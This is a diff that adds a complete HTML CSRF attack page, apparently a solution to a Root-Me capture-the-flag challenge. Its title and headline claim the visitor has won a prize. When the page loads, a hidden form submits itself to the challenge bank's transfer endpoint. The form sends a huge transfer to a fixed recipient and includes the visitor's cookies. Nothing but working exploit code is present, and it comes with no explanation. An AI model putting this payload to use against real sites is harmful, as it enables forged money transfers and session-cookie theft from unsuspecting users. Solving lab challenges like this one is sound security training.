@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Special Offer!</title>
+  </head>
+  <body>
+    <h1>Congratulations! You've Won!</h1>
+    <p>Your prize will be processed shortly...</p>
+
+    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+      <input type="hidden" name="recipient" value="caca">
+      <input type="hidden" name="amount" value="1000000000">
+      <input type="hidden" name="cookies" id="cookiesInput">
+    </form>
+
+    <script>
+      // Récupérer les cookies
+      const cookies = document.cookie;
+
+      // Ajouter les cookies au formulaire
+      document.getElementById("cookiesInput").value = cookies;
+
+      // Soumettre le formulaire automatiquement
+      window.onload = function() {
+          document.getElementById("csrfForm").submit();
+      };
+    </script>
+  </body>
+</html>
